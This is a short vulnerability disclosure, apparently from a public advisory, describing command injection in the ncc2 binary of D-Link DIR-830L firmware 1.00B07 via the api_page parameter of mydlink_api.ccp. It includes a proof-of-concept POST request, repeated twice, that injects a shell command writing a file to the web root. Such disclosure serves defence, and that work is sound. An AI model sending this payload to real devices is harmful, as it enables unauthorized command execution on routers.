# Summary
There is a command injection vulnerability in `ncc2` binary file of D-Link DIR830LA1_FW100B07, which can lead to arbitrary command execution.

Fimware download link : https://legacyfiles.us.dlink.com/DIR-830L/REVA/FIRMWARE/DIR-830L_REVA_FIRMWARE_1.00B07.ZIP

Affected component is `callback_ccp_mydlink_api` and `mydlink_api.ccp`.

# Details
In funtion `callback_ccp_mydlink_api` of `sbin/ncc2` binary file:
![image](https://github.com/user-attachments/assets/11df02eb-fcca-4e5c-ab6d-e4de0baf7f3b)

Parameter `api_page` comes from user's input thus is controllable.

Without any filter for `v6`, it is directly concatenated into `_system`, leading to command injection vulnerability.

PoC:
```
POST /mydlink_api.ccp

api_page=;";busybox >/www/poc5.html;%0a"";
```
![image](https://github.com/user-attachments/assets/ce12e62c-f5fa-442d-9826-a2a2f1489683)

After sending the packet, visit `/poc5.html`:
![image](https://github.com/user-attachments/assets/9fcf2f0c-31f4-42ef-9034-a1b24e370e91)


# PoC
**Login** first to get your cookie.
```
POST /mydlink_api.ccp

api_page=;";busybox >/www/poc5.html;%0a"";
```
![image](https://github.com/user-attachments/assets/ce12e62c-f5fa-442d-9826-a2a2f1489683)

After sending the packet, visit `/poc5.html`:
![image](https://github.com/user-attachments/assets/9fcf2f0c-31f4-42ef-9034-a1b24e370e91)
